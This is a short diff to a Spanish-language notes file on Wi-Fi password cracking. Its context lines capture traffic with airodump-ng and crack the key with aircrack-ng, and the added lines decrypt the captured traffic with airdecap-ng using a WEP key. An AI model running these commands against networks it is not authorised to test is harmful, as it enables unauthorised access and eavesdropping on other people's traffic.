@@ -15,3 +15,6 @@ sudo airodump-ng -c 6 -w capture wlp4s0f4u2mon
 
 #luego se ven las capturas, y se crackea la contraseña
 aircrack-ng capture-04.cap
+
+#desencriptar trafico
+sudo airdecap-ng -w 12:34:56:78:90 capture-04.cap
